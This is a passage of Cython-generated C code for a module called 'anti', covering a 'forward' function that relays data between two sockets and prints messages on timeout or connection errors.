            case  4: values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
                CYTHON_FALLTHROUGH;
            case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
                CYTHON_FALLTHROUGH;
            case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
                CYTHON_FALLTHROUGH;
            case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
                CYTHON_FALLTHROUGH;
            case  0: break;
            default: goto __pyx_L5_argtuple_error;
            }
            kw_args = PyDict_Size(__pyx_kwds);
            switch (pos_args) {
            case  0:
                if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_ip)) != 0)) kw_args--;
                else goto __pyx_L5_argtuple_error;
                CYTHON_FALLTHROUGH;
            case  1:
                if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_port)) != 0)) kw_args--;
                else {
                    __Pyx_RaiseArgtupleInvalid("forward", 1, 4, 4, 1); __PYX_ERR(0, 33, __pyx_L3_error)
                }
                CYTHON_FALLTHROUGH;
            case  2:
                if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_source)) != 0)) kw_args--;
                else {
                    __Pyx_RaiseArgtupleInvalid("forward", 1, 4, 4, 2); __PYX_ERR(0, 33, __pyx_L3_error)
                }
                CYTHON_FALLTHROUGH;
            case  3:
                if (likely((values[3] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_destination)) != 0)) kw_args--;
                else {
                    __Pyx_RaiseArgtupleInvalid("forward", 1, 4, 4, 3); __PYX_ERR(0, 33, __pyx_L3_error)
                }
            }
            if (unlikely(kw_args > 0)) {
                if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "forward") < 0)) __PYX_ERR(0, 33, __pyx_L3_error)
            }
        }
        else if (PyTuple_GET_SIZE(__pyx_args) != 4) {
            goto __pyx_L5_argtuple_error;
        }
        else {
            values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
            values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
            values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
            values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
        }
        __pyx_v_ip = values[0];
        __pyx_v_port = values[1];
        __pyx_v_source = values[2];
        __pyx_v_destination = values[3];
    }
    goto __pyx_L4_argument_unpacking_done;
__pyx_L5_argtuple_error:;
    __Pyx_RaiseArgtupleInvalid("forward", 1, 4, 4, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 33, __pyx_L3_error)
        __pyx_L3_error:;
    __Pyx_AddTraceback("anti.forward", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __Pyx_RefNannyFinishContext();
    return NULL;
__pyx_L4_argument_unpacking_done:;
    __pyx_r = __pyx_pf_4anti_6forward(__pyx_self, __pyx_v_ip, __pyx_v_port, __pyx_v_source, __pyx_v_destination);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_6forward(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_ip, PyObject* __pyx_v_port, PyObject* __pyx_v_source, PyObject* __pyx_v_destination) {
    PyObject* __pyx_v_string = NULL;
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    int __pyx_t_4;
    PyObject* __pyx_t_5 = NULL;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    PyObject* __pyx_t_8 = NULL;
    int __pyx_t_9;
    PyObject* __pyx_t_10 = NULL;
    PyObject* __pyx_t_11 = NULL;
    PyObject* __pyx_t_12 = NULL;
    PyObject* __pyx_t_13 = NULL;
    PyObject* __pyx_t_14 = NULL;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("forward", 0);
    {
        __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
        __Pyx_XGOTREF(__pyx_t_1);
        __Pyx_XGOTREF(__pyx_t_2);
        __Pyx_XGOTREF(__pyx_t_3); {
            __Pyx_INCREF(__pyx_kp_u__2);
            __pyx_v_string = __pyx_kp_u__2;
            while (1) {
                __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_v_string); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 36, __pyx_L3_error)
                    if (!__pyx_t_4) break;
                __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_source, __pyx_n_s_recv); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 37, __pyx_L3_error)
                    __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_7 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
                    if (likely(__pyx_t_7)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                        __Pyx_INCREF(__pyx_t_7);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_6, function);
                    }
                }
                __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_int_1024) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_int_1024);
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 37, __pyx_L3_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF_SET(__pyx_v_string, __pyx_t_5);
                __pyx_t_5 = 0;
                __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_v_string); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 38, __pyx_L3_error)
                    if (__pyx_t_4) {
                        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_destination, __pyx_n_s_sendall); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 39, __pyx_L3_error)
                            __Pyx_GOTREF(__pyx_t_6);
                        __pyx_t_7 = NULL;
                        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
                            if (likely(__pyx_t_7)) {
                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                                __Pyx_INCREF(__pyx_t_7);
                                __Pyx_INCREF(function);
                                __Pyx_DECREF_SET(__pyx_t_6, function);
                            }
                        }
                        __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_v_string) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_v_string);
                        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 39, __pyx_L3_error)
                            __Pyx_GOTREF(__pyx_t_5);
                        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                        goto __pyx_L11;
                    } {
                    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_source, __pyx_n_s_shutdown); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 41, __pyx_L3_error)
                        __Pyx_GOTREF(__pyx_t_6);
                    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_socket); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 41, __pyx_L3_error)
                        __Pyx_GOTREF(__pyx_t_7);
                    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_SHUT_RD); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 41, __pyx_L3_error)
                        __Pyx_GOTREF(__pyx_t_8);
                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                    __pyx_t_7 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
                        if (likely(__pyx_t_7)) {
                            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                            __Pyx_INCREF(__pyx_t_7);
                            __Pyx_INCREF(function);
                            __Pyx_DECREF_SET(__pyx_t_6, function);
                        }
                    }
                    __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8);
                    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
                    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 41, __pyx_L3_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_destination, __pyx_n_s_shutdown); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 42, __pyx_L3_error)
                        __Pyx_GOTREF(__pyx_t_6);
                    __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_socket); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 42, __pyx_L3_error)
                        __Pyx_GOTREF(__pyx_t_8);
                    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_SHUT_WR); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 42, __pyx_L3_error)
                        __Pyx_GOTREF(__pyx_t_7);
                    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
                    __pyx_t_8 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
                        if (likely(__pyx_t_8)) {
                            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                            __Pyx_INCREF(__pyx_t_8);
                            __Pyx_INCREF(function);
                            __Pyx_DECREF_SET(__pyx_t_6, function);
                        }
                    }
                    __pyx_t_5 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7);
                    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 42, __pyx_L3_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                }
            __pyx_L11:;
            }
        }
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        goto __pyx_L8_try_end;
    __pyx_L3_error:;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_ErrFetch(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_TimeoutError); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 43, __pyx_L5_except_error)
            __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_8);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_ErrRestore(__pyx_t_5, __pyx_t_6, __pyx_t_7);
        __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_7 = 0;
        if (__pyx_t_9) {
            __Pyx_AddTraceback("anti.forward", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 43, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_7);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Timeout_Port_from, __pyx_n_s_format); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 44, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 44, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_12 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_ip); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 44, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_13 = NULL;
            __pyx_t_9 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_13)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                    __Pyx_INCREF(__pyx_t_13);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_10, function);
                    __pyx_t_9 = 1;
                }
            }
#if CYTHON_FAST_PYCALL
            if (PyFunction_Check(__pyx_t_10)) {
                PyObject* __pyx_temp[3] = { __pyx_t_13, __pyx_t_11, __pyx_t_12 };
                __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 44, __pyx_L5_except_error)
                    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                __Pyx_GOTREF(__pyx_t_8);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            else
#endif
#if CYTHON_FAST_PYCCALL
                if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                    PyObject* __pyx_temp[3] = { __pyx_t_13, __pyx_t_11, __pyx_t_12 };
                    __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 44, __pyx_L5_except_error)
                        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                    __Pyx_GOTREF(__pyx_t_8);
                    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                }
                else
#endif
                {
                    __pyx_t_14 = PyTuple_New(2 + __pyx_t_9); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 44, __pyx_L5_except_error)
                        __Pyx_GOTREF(__pyx_t_14);
                    if (__pyx_t_13) {
                        __Pyx_GIVEREF(__pyx_t_13); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_13); __pyx_t_13 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_11);
                    PyTuple_SET_ITEM(__pyx_t_14, 0 + __pyx_t_9, __pyx_t_11);
                    __Pyx_GIVEREF(__pyx_t_12);
                    PyTuple_SET_ITEM(__pyx_t_14, 1 + __pyx_t_9, __pyx_t_12);
                    __pyx_t_11 = 0;
                    __pyx_t_12 = 0;
                    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_14, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 44, __pyx_L5_except_error)
                        __Pyx_GOTREF(__pyx_t_8);
                    __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
                }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 44, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            goto __pyx_L4_exception_handled;
        }
        __Pyx_ErrFetch(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ConnectionAbortedError); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 45, __pyx_L5_except_error)
            __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_9 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_10);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_ErrRestore(__pyx_t_5, __pyx_t_6, __pyx_t_7);
        __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_7 = 0;
        if (__pyx_t_9) {
            __Pyx_AddTraceback("anti.forward", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 45, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_7);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Aborted_connection_Port_from, __pyx_n_s_format); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 46, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_14 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 46, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_12 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_ip); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 46, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_11 = NULL;
            __pyx_t_9 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
                __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_8);
                if (likely(__pyx_t_11)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                    __Pyx_INCREF(__pyx_t_11);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_8, function);
                    __pyx_t_9 = 1;
                }
            }
#if CYTHON_FAST_PYCALL
            if (PyFunction_Check(__pyx_t_8)) {
                PyObject* __pyx_temp[3] = { __pyx_t_11, __pyx_t_14, __pyx_t_12 };
                __pyx_t_10 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 46, __pyx_L5_except_error)
                    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_GOTREF(__pyx_t_10);
                __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            else
#endif
#if CYTHON_FAST_PYCCALL
                if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
                    PyObject* __pyx_temp[3] = { __pyx_t_11, __pyx_t_14, __pyx_t_12 };
                    __pyx_t_10 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 46, __pyx_L5_except_error)
                        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                    __Pyx_GOTREF(__pyx_t_10);
                    __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
                    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                }
                else
#endif
                {
                    __pyx_t_13 = PyTuple_New(2 + __pyx_t_9); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 46, __pyx_L5_except_error)
                        __Pyx_GOTREF(__pyx_t_13);
                    if (__pyx_t_11) {
                        __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_11); __pyx_t_11 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_14);
                    PyTuple_SET_ITEM(__pyx_t_13, 0 + __pyx_t_9, __pyx_t_14);
                    __Pyx_GIVEREF(__pyx_t_12);
                    PyTuple_SET_ITEM(__pyx_t_13, 1 + __pyx_t_9, __pyx_t_12);
                    __pyx_t_14 = 0;
                    __pyx_t_12 = 0;
                    __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_13, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 46, __pyx_L5_except_error)
                        __Pyx_GOTREF(__pyx_t_10);
                    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                }
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 46, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            goto __pyx_L4_exception_handled;
        }
        __Pyx_ErrFetch(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ConnectionResetError); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 47, __pyx_L5_except_error)
            __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_8);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_ErrRestore(__pyx_t_5, __pyx_t_6, __pyx_t_7);
        __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_7 = 0;
        if (__pyx_t_9) {
            __Pyx_AddTraceback("anti.forward", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 47, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_7);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Close_connection_Port_from, __pyx_n_s_format); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 48, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_13 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 48, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_12 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_ip); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 48, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_14 = NULL;
            __pyx_t_9 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
                __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_10);
                if (likely(__pyx_t_14)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                    __Pyx_INCREF(__pyx_t_14);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_10, function);
                    __pyx_t_9 = 1;
                }
            }
#if CYTHON_FAST_PYCALL
            if (PyFunction_Check(__pyx_t_10)) {
                PyObject* __pyx_temp[3] = { __pyx_t_14, __pyx_t_13, __pyx_t_12 };
                __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 48, __pyx_L5_except_error)
                    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                __Pyx_GOTREF(__pyx_t_8);
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            else
#endif
#if CYTHON_FAST_PYCCALL
                if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
                    PyObject* __pyx_temp[3] = { __pyx_t_14, __pyx_t_13, __pyx_t_12 };
                    __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 48, __pyx_L5_except_error)
                        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                    __Pyx_GOTREF(__pyx_t_8);
                    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                }
                else
#endif
                {
                    __pyx_t_11 = PyTuple_New(2 + __pyx_t_9); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 48, __pyx_L5_except_error)
                        __Pyx_GOTREF(__pyx_t_11);
                    if (__pyx_t_14) {
                        __Pyx_GIVEREF(__pyx_t_14); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_14); __pyx_t_14 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_13);
                    PyTuple_SET_ITEM(__pyx_t_11, 0 + __pyx_t_9, __pyx_t_13);
                    __Pyx_GIVEREF(__pyx_t_12);
                    PyTuple_SET_ITEM(__pyx_t_11, 1 + __pyx_t_9, __pyx_t_12);
                    __pyx_t_13 = 0;
                    __pyx_t_12 = 0;
                    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_11, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 48, __pyx_L5_except_error)
                        __Pyx_GOTREF(__pyx_t_8);
                    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 48, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            goto __pyx_L4_exception_handled;
        }
        __Pyx_ErrFetch(&__pyx_t_5, &__pyx_t_6, &__pyx_t_7);
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ConnectionRefusedError); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 49, __pyx_L5_except_error)
            __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_9 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_10);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_ErrRestore(__pyx_t_5, __pyx_t_6, __pyx_t_7);
        __pyx_t_5 = 0; __pyx_t_6 = 0; __pyx_t_7 = 0;
        if (__pyx_t_9) {
            __Pyx_AddTraceback("anti.forward", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 49, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_7);
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Connection_refused_Port_from, __pyx_n_s_format); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 50, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 50, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_11);
